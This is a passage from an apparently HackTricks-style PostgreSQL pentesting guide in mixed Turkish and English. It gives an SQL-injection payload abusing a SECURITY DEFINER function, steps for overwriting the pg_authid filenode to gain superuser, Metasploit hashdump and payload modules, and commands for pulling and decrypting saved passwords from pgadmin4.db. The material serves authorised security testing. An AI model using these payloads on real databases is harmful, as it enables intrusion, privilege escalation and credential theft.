BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) belirtildiği gibi, **SECURITY DEFINER ile tanımlanmış bir fonksiyon**, onu sahiplenen **kullanıcının** yetkileriyle çalıştırılır. Bu yüzden, eğer fonksiyon **vulnerable to SQL Injection** ise veya saldırgan tarafından kontrol edilen parametrelerle bazı **privileged actions** yapıyorsa, bu durum **escalate privileges inside postgres** için kötüye kullanılabilir.

Önceki kod bloğunun 4. satırında fonksiyonun **SECURITY DEFINER** flag'ine sahip olduğunu görebilirsiniz.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
And then **execute commands**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce ile PL/pgSQL

**PL/pgSQL** SQL'e kıyasla daha fazla prosedürel kontrol sunan **tam özellikli bir programlama dili**dir. Program mantığını geliştirmek için **loops** ve diğer **control structures** kullanımına olanak tanır. Ayrıca, **SQL statements** ve **triggers**, **PL/pgSQL language** ile oluşturulan fonksiyonları çağırma yeteneğine sahiptir. Bu entegrasyon, veritabanı programlama ve otomasyon için daha kapsamlı ve esnek bir yaklaşım sağlar.\
**Bu dili kötüye kullanarak PostgreSQL'den kullanıcı kimlik bilgilerini brute-force etmesini sağlayabilirsiniz.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc ile Dahili PostgreSQL Tablolarını Üzerine Yazma

> [!TIP]
> Aşağıdaki privesc vektörü, kısıtlı SQLi bağlamlarında özellikle kullanışlıdır; çünkü tüm adımlar iç içe SELECT ifadeleriyle gerçekleştirilebilir

Eğer PostgreSQL sunucu dosyalarını okuyup yazabiliyorsanız, dahili `pg_authid` tablosuyla ilişkili PostgreSQL on-disk filenode'unu üzerine yazarak superuser olabilirsiniz.

Read more about **this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

The attack steps are:

1. PostgreSQL data directory'yi edinin
2. `pg_authid` tablosuyla ilişkili filenode'a göreli yolu edinin
3. Filenode'u `lo_*` fonksiyonları aracılığıyla indirin
4. `pg_authid` tablosuyla ilişkili datatype'ı alın
5. [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) kullanarak filenode'u [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); tüm `rol*` boolean bayraklarını tam izinler için 1 olarak ayarlayın.
6. Düzenlenmiş filenode'u `lo_*` fonksiyonlarıyla yeniden yükleyin ve diskteki orijinal dosyanın üzerine yazın
7. (İsteğe bağlı olarak) Pahalı bir SQL sorgusu çalıştırarak bellek içi tablo önbelleğini temizleyin
8. Artık tam superadmin ayrıcalıklarına sahip olmalısınız.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

_**postgresql.conf**_ dosyasında postgresql logs'u etkinleştirmek için şu şekilde değiştirin:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Ardından, **hizmeti yeniden başlatın**.

### pgadmin

[pgadmin](https://www.pgadmin.org) PostgreSQL için bir yönetim ve geliştirme platformudur.\
_**pgadmin4.db**_ dosyası içinde **şifreleri** bulabilirsiniz.\
Bunları betikteki _**decrypt**_ fonksiyonunu kullanarak çözebilirsiniz: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

PostgreSQL'de istemci kimlik doğrulaması **pg_hba.conf** adlı yapılandırma dosyasıyla yönetilir. Bu dosya, her biri bir bağlantı türünü, istemci IP adres aralığını (uygunsa), veritabanı adını, kullanıcı adını ve eşleşen bağlantılar için kullanılacak kimlik doğrulama yöntemini belirten bir dizi kayıt içerir. Bağlantı türü, istemci adresi, talep edilen veritabanı ve kullanıcı adı ile eşleşen ilk kayıt kimlik doğrulama için kullanılır. Kimlik doğrulama başarısız olursa geri dönüş veya yedek yoktur. Hiçbir kayıt eşleşmezse erişim reddedilir.

pg_hba.conf'deki parola tabanlı kullanılabilir kimlik doğrulama yöntemleri **md5**, **crypt** ve **password**'dir. Bu yöntemler parolanın nasıl iletildiği konusunda farklılık gösterir: MD5 ile hash'lenmiş, crypt ile şifrelenmiş veya düz metin. crypt yönteminin pg_authid içinde şifrelenmiş parolalarla kullanılamayacağını not etmek önemlidir.

## Kaynaklar

- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
